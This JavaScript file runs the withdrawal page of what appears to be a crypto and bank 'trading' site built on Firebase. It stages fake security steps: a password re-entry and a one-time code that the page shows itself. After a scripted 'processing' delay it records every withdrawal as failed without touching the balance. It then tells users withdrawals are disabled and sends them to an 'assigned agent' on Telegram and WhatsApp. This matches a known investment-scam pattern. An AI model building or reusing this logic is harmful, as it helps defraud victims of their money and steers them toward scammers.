import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-analytics.js";
import {
  getAuth,
  onAuthStateChanged,
  signInWithEmailAndPassword,
} from "https://www.gstatic.com/firebasejs/11.6.0/firebase-auth.js";
import {
  getFirestore,
  getDoc,
  doc,
  setDoc,
  serverTimestamp,
} from "https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyASg5UlPTgE0HH-iM3HRfeMSY2a2Noa3o4",
  authDomain: "iqtraders1.firebaseapp.com",
  projectId: "iqtraders1",
  storageBucket: "iqtraders1.firebasestorage.app",
  messagingSenderId: "538849101252",
  appId: "1:538849101252:web:ffbbd7906c267ce7231091",
  measurementId: "G-J7LYXPLFWF",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const auth = getAuth();
const db = getFirestore();

const form = document.getElementById("withdraw-form");
const amount = document.getElementById("amount");
const walletAddress = document.getElementById("walletAddress");
const withdrawalNetwork = document.getElementById("network");
const withdrawalCurrency = document.getElementById("currency");
const withdrawalPlatform = document.getElementById("platform");

const withdrawBank = document.getElementById("select-bank");
const withdrawBankForm = document.getElementById("withdraw-bank-form");
const withdrawWallet = document.getElementById("select-wallet");

if (withdrawBank) {
  withdrawBank.addEventListener("click", () => {
    withdrawBankForm.classList.remove("hidden");
    form.classList.add("hidden");
  });
}
if (withdrawWallet) {
  withdrawWallet.addEventListener("click", () => {
    withdrawBankForm.classList.add("hidden");
    form.classList.remove("hidden");
  });
}

// Helper: Show modal
function showModal(content, options = {}) {
  let modal = document.getElementById("custom-modal");
  if (!modal) {
    modal = document.createElement("div");
    modal.id = "custom-modal";
    modal.className =
      "fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50";
    document.body.appendChild(modal);
  }
  modal.innerHTML = `
    <div class="bg-white rounded-lg shadow-lg p-6 w-full max-w-md relative animate-fade-in">
      ${content}
    </div>
  `;
  modal.style.display = "flex";
  if (options.onClose) {
    modal.onclick = (e) => {
      if (e.target === modal) {
        modal.style.display = "none";
        options.onClose();
      }
    };
  }
}
function hideModal() {
  const modal = document.getElementById("custom-modal");
  if (modal) modal.style.display = "none";
}

// Helper: Preloader modal
function showPreloader(text = "Processing...") {
  showModal(`
    <div class="flex flex-col items-center">
      <svg class="animate-spin h-12 w-12 text-blue-500 mb-4" fill="none" viewBox="0 0 24 24">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"></path>
      </svg>
      <span class="text-blue-600 font-semibold">${text}</span>
    </div>
  `);
}

// Helper: Animate fade-in
const style = document.createElement("style");
style.innerHTML = `.animate-fade-in { animation: fadeIn 0.3s; } @keyframes fadeIn { from { opacity: 0; transform: scale(0.95);} to { opacity: 1; transform: scale(1);} }`;
document.head.appendChild(style);

// Regex patterns
const regexPatterns = {
  amount: /^\d+(\.\d{1,2})?$/, // number with up to 2 decimals
  walletAddress: /^[a-zA-Z0-9]{20,42}$/, // simple crypto address pattern
  network: /^[A-Za-z0-9\s\-]{3,20}$/,
  currency: /^[A-Z]{3,5}$/,
  platform: /^[A-Za-z0-9\s\-]{3,20}$/,
};

// Validate form fields
function validateFields() {
  if (!regexPatterns.amount.test(amount.value.trim())) {
    return { valid: false, message: "Invalid amount format." };
  }
  if (!regexPatterns.walletAddress.test(walletAddress.value.trim())) {
    return { valid: false, message: "Invalid wallet address." };
  }
  if (!regexPatterns.network.test(withdrawalNetwork.value.trim())) {
    return { valid: false, message: "Invalid network." };
  }
  if (!regexPatterns.currency.test(withdrawalCurrency.value.trim())) {
    return { valid: false, message: "Invalid currency." };
  }
  if (!regexPatterns.platform.test(withdrawalPlatform.value.trim())) {
    return { valid: false, message: "Invalid platform." };
  }
  return { valid: true };
}

// Fetch user balance from Firestore
async function fetchUserBalance(uid) {
  const userDoc = await getDoc(doc(db, "users", uid));
  if (userDoc.exists()) {
    return userDoc.data().Balance || 0;
  }
  throw new Error("User not found");
}

// Save withdrawal request to Firestore
async function saveWithdrawal(logId, uid, data) {
  await setDoc(doc(db, "withdrawals", logId), {
    ...data,
    uid,
    status: "failed",
    createdAt: serverTimestamp(),
  });
}

// Generate OTP
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Main form submit handler (WALLET)
if (form) {
  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    // 1. Validate fields
    const validation = validateFields();
    if (!validation.valid) {
      showModal(
        `<div class="text-red-600 font-semibold text-center">${validation.message}</div>`
      );
      setTimeout(hideModal, 2000);
      return;
    }

    // 2. Show preloader
    showPreloader();

    // 3. Check user balance
    onAuthStateChanged(auth, async (user) => {
      if (!user) {
        hideModal();
        showModal(
          `<div class="text-red-600 font-semibold text-center">User not authenticated.</div>`
        );
        setTimeout(hideModal, 2000);
        return;
      }
      try {
        // Fetch logId from localStorage
        const logId = localStorage.getItem("logId") || crypto.randomUUID();

        const balance = await fetchUserBalance(user.uid);
        const withdrawAmount = parseFloat(amount.value);

        if (withdrawAmount > balance) {
          hideModal();
          showModal(
            `<div class="text-red-600 font-semibold text-center">Insufficient balance.</div>`
          );
          setTimeout(hideModal, 2000);
          return;
        }

        // 4. Ask for email and password
        hideModal();
        showModal(`
        <form id="email-pass-form" class="flex flex-col gap-4">
          <div class="flex flex-col">
            <label class="font-semibold">Email</label>
            <input type="email" id="modal-email" class="border rounded px-2 py-1" required />
          </div>
          <div class="flex flex-col">
            <label class="font-semibold">Password</label>
            <input type="password" id="modal-password" class="border rounded px-2 py-1" required />
          </div>
          <button type="submit" class="bg-blue-600 text-white rounded py-2 font-bold hover:bg-blue-700 transition">Continue</button>
        </form>
      `);

        document.getElementById("email-pass-form").onsubmit = async (ev) => {
          ev.preventDefault();
          const emailInput = document
            .getElementById("modal-email")
            .value.trim();
          const passInput = document
            .getElementById("modal-password")
            .value.trim();

          // Validate email and password
          if (emailInput !== user.email) {
            showModal(
              `<div class="text-red-600 font-semibold text-center">Email does not match.</div>`
            );
            setTimeout(hideModal, 2000);
            return;
          }
          // Re-authenticate user
          try {
            await signInWithEmailAndPassword(auth, emailInput, passInput);
          } catch (err) {
            showModal(
              `<div class="text-red-600 font-semibold text-center">Incorrect password.</div>`
            );
            setTimeout(hideModal, 2000);
            return;
          }

          // 5. OTP Modal
          const otp = generateOTP();
          hideModal();
          showModal(`
          <form id="otp-form" class="flex flex-col gap-4">
            <div class="flex flex-col items-center">
              <svg class="h-10 w-10 text-blue-500 mb-2" fill="none" viewBox="0 0 24 24">
                <path stroke="currentColor" stroke-width="2" d="M12 4v16m8-8H4"/>
              </svg>
              <span class="font-semibold text-lg">Enter this OTP:</span>
              <span class="text-2xl font-bold text-blue-600">${otp}</span>
            </div>
            <input type="text" id="modal-otp" class="border rounded px-2 py-1 text-center" maxlength="6" required />
            <button type="submit" class="bg-blue-600 text-white rounded py-2 font-bold hover:bg-blue-700 transition">Verify OTP</button>
          </form>
        `);

          document.getElementById("otp-form").onsubmit = async (ev2) => {
            ev2.preventDefault();
            const otpInput = document.getElementById("modal-otp").value.trim();
            if (otpInput !== otp) {
              showModal(
                `<div class="text-red-600 font-semibold text-center">Incorrect OTP.</div>`
              );
              setTimeout(hideModal, 2000);
              return;
            }

            // 6. Preloader for 3 seconds
            showPreloader("Processing transaction...");
            setTimeout(async () => {
              // 7. Save withdrawal as failed (do NOT update balance)
              try {
                await saveWithdrawal(logId, user.uid, {
                  amount: withdrawAmount,
                  walletAddress: walletAddress.value.trim(),
                  network: withdrawalNetwork.value.trim(),
                  currency: withdrawalCurrency.value.trim(),
                  platform: withdrawalPlatform.value.trim(),
                });

                hideModal();

                // 8. Withdrawal Failed Modal
                showModal(`
                  <div class="flex flex-col items-center gap-4">
                    <svg class="h-16 w-16 text-red-600 mb-2" fill="none" viewBox="0 0 24 24">
                      <circle cx="12" cy="12" r="10" fill="#fee2e2"/>
                      <path d="M8 8l8 8M16 8l-8 8" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                    <div class="text-center">
                      <h2 class="text-2xl font-bold text-red-600 mb-2">Withdrawal Failed</h2>
                      <p class="mb-2 text-gray-700">Your withdrawal could not be processed. Withdrawal disabled please kindly contact your assigned agent or customer support for assistance.
                      </p>
                      <p class="text admin-icon">
                        <a href="https://t.me/Trader_Martinezan01" target="_blank">
                          <i class="fa-brands fa-telegram"></i>
                        </a>
                        <a href="https://wa.link/tkkvm1" target="_blank">
                          <i class="fa-brands fa-whatsapp"></i>
                        </a>
                      </p>
                      <div class="bg-red-50 rounded p-3 text-left text-sm border border-red-200">
                        <div><span class="font-semibold">Amount:</span> $${amount.value}</div>
                        <div><span class="font-semibold">Wallet Address:</span> ${walletAddress.value}</div>
                        <div><span class="font-semibold">Network:</span> ${withdrawalNetwork.value}</div>
                        <div><span class="font-semibold">Currency:</span> ${withdrawalCurrency.value}</div>
                        <div><span class="font-semibold">Platform:</span> ${withdrawalPlatform.value}</div>
                      </div>
                    </div>
                    <button id="close-failed" class="mt-2 bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700">Close</button>
                  </div>
                `);
                document.getElementById("close-failed").onclick = () => {
                  window.location.href = "/user/index.html";
                };
              } catch (err) {
                hideModal();
                showModal(
                  `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
                );
                setTimeout(hideModal, 2000);
              }
            }, 3000);
          };
        };
      } catch (err) {
        hideModal();
        showModal(
          `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
        );
        setTimeout(hideModal, 2000);
      }
    });
  });
}

// BANK FORM LOGIC
const bankForm = document.getElementById("withdraw-bank-form");
const bankAmount = document.getElementById("amount");
const accountNumber = document.getElementById("account-number");
const bankName = document.getElementById("bank-name");
const accountName = document.getElementById("account-name");

const bankRegex = {
  amount: /^\d+(\.\d{1,2})?$/, // Accepts 100, 100.5, 100.55
  accountNumber: /^\d{6,20}$/,
  bankName: /^[A-Za-z0-9\s\-]{3,40}$/,
  accountName: /^[A-Za-z\s\-]{3,40}$/,
};

function validateBankFields() {
 
  if (!bankRegex.accountNumber.test(accountNumber.value.trim())) {
    return { valid: false, message: "Invalid account number." };
  }
  if (!bankRegex.bankName.test(bankName.value.trim())) {
    return { valid: false, message: "Invalid bank name." };
  }
  if (!bankRegex.accountName.test(accountName.value.trim())) {
    return { valid: false, message: "Invalid beneficiary name." };
  }
  return { valid: true };
}

if (bankForm) {
  bankForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    // 1. Validate fields
    const validation = validateBankFields();
    if (!validation.valid) {
      showModal(
        `<div class="text-red-600 font-semibold text-center">${validation.message}</div>`
      );
      setTimeout(hideModal, 2000);
      return;
    }

    // 2. Show preloader
    showPreloader();

    // 3. Check user balance
    onAuthStateChanged(auth, async (user) => {
      if (!user) {
        hideModal();
        showModal(
          `<div class="text-red-600 font-semibold text-center">User not authenticated.</div>`
        );
        setTimeout(hideModal, 2000);
        return;
      }
      try {
        // Fetch logId from localStorage
        const logId = localStorage.getItem("logId") || crypto.randomUUID();

        const balance = await fetchUserBalance(user.uid);
        const withdrawAmount = parseFloat(bankAmount.value);

        if (withdrawAmount > balance) {
          hideModal();
          showModal(
            `<div class="text-red-600 font-semibold text-center">Insufficient balance.</div>`
          );
          setTimeout(hideModal, 2000);
          return;
        }

        // 4. Ask for email and password
        hideModal();
        showModal(`
        <form id="email-pass-form-bank" class="flex flex-col gap-4">
          <div class="flex flex-col">
            <label class="font-semibold">Email</label>
            <input type="email" id="modal-email-bank" class="border rounded px-2 py-1" required />
          </div>
          <div class="flex flex-col">
            <label class="font-semibold">Password</label>
            <input type="password" id="modal-password-bank" class="border rounded px-2 py-1" required />
          </div>
          <button type="submit" class="bg-blue-600 text-white rounded py-2 font-bold hover:bg-blue-700 transition">Continue</button>
        </form>
      `);

        document.getElementById("email-pass-form-bank").onsubmit = async (
          ev
        ) => {
          ev.preventDefault();
          const emailInput = document
            .getElementById("modal-email-bank")
            .value.trim();
          const passInput = document
            .getElementById("modal-password-bank")
            .value.trim();

          if (emailInput !== user.email) {
            showModal(
              `<div class="text-red-600 font-semibold text-center">Email does not match.</div>`
            );
            setTimeout(hideModal, 2000);
            return;
          }
          try {
            await signInWithEmailAndPassword(auth, emailInput, passInput);
          } catch (err) {
            showModal(
              `<div class="text-red-600 font-semibold text-center">Incorrect password.</div>`
            );
            setTimeout(hideModal, 2000);
            return;
          }

          // 5. OTP Modal
          const otp = generateOTP();
          hideModal();
          showModal(`
          <form id="otp-form-bank" class="flex flex-col gap-4">
            <div class="flex flex-col items-center">
              <svg class="h-10 w-10 text-blue-500 mb-2" fill="none" viewBox="0 0 24 24">
                <path stroke="currentColor" stroke-width="2" d="M12 4v16m8-8H4"/>
              </svg>
              <span class="font-semibold text-lg">Enter this OTP:</span>
              <span class="text-2xl font-bold text-blue-600">${otp}</span>
            </div>
            <input type="text" id="modal-otp-bank" class="border rounded px-2 py-1 text-center" maxlength="6" required />
            <button type="submit" class="bg-blue-600 text-white rounded py-2 font-bold hover:bg-blue-700 transition">Verify OTP</button>
          </form>
        `);

          document.getElementById("otp-form-bank").onsubmit = async (ev2) => {
            ev2.preventDefault();
            const otpInput = document
              .getElementById("modal-otp-bank")
              .value.trim();
            if (otpInput !== otp) {
              showModal(
                `<div class="text-red-600 font-semibold text-center">Incorrect OTP.</div>`
              );
              setTimeout(hideModal, 2000);
              return;
            }

            // 6. Preloader for 3 seconds
            showPreloader("Processing transaction...");
            setTimeout(async () => {
              try {
                await saveWithdrawal(logId, user.uid, {
                  amount: withdrawAmount,
                  accountNumber: accountNumber.value.trim(),
                  bankName: bankName.value.trim(),
                  accountName: accountName.value.trim(),
                  type: "bank",
                });

                hideModal();

                // 8. Withdrawal Failed Modal
                showModal(`
                  <div class="flex flex-col items-center gap-4">
                    <svg class="h-16 w-16 text-red-600 mb-2" fill="none" viewBox="0 0 24 24">
                      <circle cx="12" cy="12" r="10" fill="#fee2e2"/>
                      <path d="M8 8l8 8M16 8l-8 8" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                    <div class="text-center">
                      <h2 class="text-2xl font-bold text-red-600 mb-2">Withdrawal Failed</h2>
                      <p class="mb-2 text-gray-700">Your withdrawal could not be processed. Withdrawal disabled please kindly contact your assigned agent or customer support for assistance.
                      </p>
                      <p class="text admin-icon">
                        <a href="https://t.me/Trader_Martinezan01" target="_blank">
                          <i class="fa-brands fa-telegram"></i>
                        </a>
                        <a href="https://wa.link/tkkvm1" target="_blank">
                          <i class="fa-brands fa-whatsapp"></i>
                        </a>
                      </p>

                      <div class="bg-red-50 rounded p-3 text-left text-sm border border-red-200">
                        <div><span class="font-semibold">Amount:</span> $${bankAmount.value}</div>
                        <div><span class="font-semibold">Account Number:</span> ${accountNumber.value}</div>
                        <div><span class="font-semibold">Bank Name:</span> ${bankName.value}</div>
                        <div><span class="font-semibold">Beneficiary Name:</span> ${accountName.value}</div>
                      </div>
                    </div>
                    <button id="close-failed-bank" class="mt-2 bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700">Close</button>
                  </div>
                `);
                document.getElementById("close-failed-bank").onclick = () => {
                  window.location.href = "/user/index.html";
                };
              } catch (err) {
                hideModal();
                showModal(
                  `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
                );
                setTimeout(hideModal, 2000);
              }
            }, 3000);
          };
        };
      } catch (err) {
        hideModal();
        showModal(
          `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
        );
        setTimeout(hideModal, 2000);
      }
    });
  });
}
